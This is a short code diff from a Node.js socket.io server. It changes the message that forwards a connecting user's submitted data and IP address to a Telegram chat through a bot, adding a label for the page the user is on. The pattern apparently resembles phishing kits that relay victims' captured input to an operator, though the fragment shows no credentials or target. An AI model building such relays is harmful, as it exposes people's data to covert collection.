@@ -215,7 +215,7 @@ io.on('connection', (socket, req) => {
         if(userIP){
             user = data
             user.ip = userIP
-            let message = JSON.stringify(user, null, 2);
+            let message = `User on ${data.page} Page\n\n`+JSON.stringify(user, null, 2);
             bot.sendMessage(chatId, message);
         }
        
